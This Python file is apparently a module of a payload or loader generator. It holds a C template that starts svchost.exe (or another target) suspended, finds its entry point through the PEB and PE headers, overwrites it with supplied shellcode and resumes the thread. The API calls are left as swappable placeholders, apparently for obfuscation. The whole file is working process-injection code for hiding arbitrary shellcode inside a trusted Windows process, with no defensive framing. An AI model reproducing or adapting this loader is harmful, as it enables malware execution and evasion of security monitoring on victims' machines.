from string import Template

class processstomp:
    def __init__(self, arguments):
        self.target = 'C:\\\\windows\\\\system32\\\\svchost.exe'
        if 'target' in arguments:
            self.target = arguments['target'].replace('\\','\\\\')

    def imports(self) -> list[str]:
        return ["#include <windows.h>", 
                "#include <stdio.h>", 
                "#include <stdlib.h>", 
                "#include <winternl.h>"]

    def compilerOptions(self) -> list[str]:
        return []

    def codeblocks(self) -> str:
        return ''

    def apicalls(self) -> list[str]:
        return ['NtQueryInformationProcess', 'CreateProcessA', 'ReadProcessMemory', 'WriteProcessMemory', 'ResumeThread', 'CloseHandle']

    def template(self) -> str:
        return Template("""
    {transformers}

    STARTUPINFOA si = {{
        sizeof(si)
    }}; 
    PROCESS_INFORMATION pi; 

    PPEB pPeb;
    PVOID pImage, pEntry;
    PIMAGE_NT_HEADERS pNtHeaders;
    LONG e_lfanew;
    SIZE_T NumberOfBytesRead;
    DWORD AddressOfEntryPoint;

    {CreateProcessA}(NULL, (LPSTR) "$target", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);

    NTSTATUS status;
    PROCESS_BASIC_INFORMATION pbi;

    memset(&pbi, 0, sizeof(pbi));

    status = {NtQueryInformationProcess}(
    pi.hProcess,
    ProcessBasicInformation,
    &pbi,
    sizeof(pbi),
    NULL);

    pPeb = pbi.PebBaseAddress;

    {ReadProcessMemory}(
        pi.hProcess,
        &pPeb->Reserved3[1],
        &pImage,
        sizeof(pImage),
        &NumberOfBytesRead);
        
    {ReadProcessMemory}(
        pi.hProcess,
        (PCHAR)pImage + offsetof(IMAGE_DOS_HEADER, e_lfanew),
        &e_lfanew,
        sizeof(e_lfanew),
        &NumberOfBytesRead);
    pNtHeaders = (PIMAGE_NT_HEADERS)((PCHAR)pImage + e_lfanew);

    {ReadProcessMemory}(
        pi.hProcess,
        (PCHAR)pNtHeaders + offsetof(IMAGE_NT_HEADERS, OptionalHeader.AddressOfEntryPoint),
        &AddressOfEntryPoint,
        sizeof(AddressOfEntryPoint),
        &NumberOfBytesRead);
    pEntry = (PVOID)((PCHAR)pImage + AddressOfEntryPoint);
    
    {WriteProcessMemory}(pi.hProcess, pEntry, shellcode, {shellcodeSize}, NULL);

    {ResumeThread}(pi.hThread);

    {CloseHandle}(pi.hThread);
    {CloseHandle}(pi.hProcess);

""").substitute(target=self.target)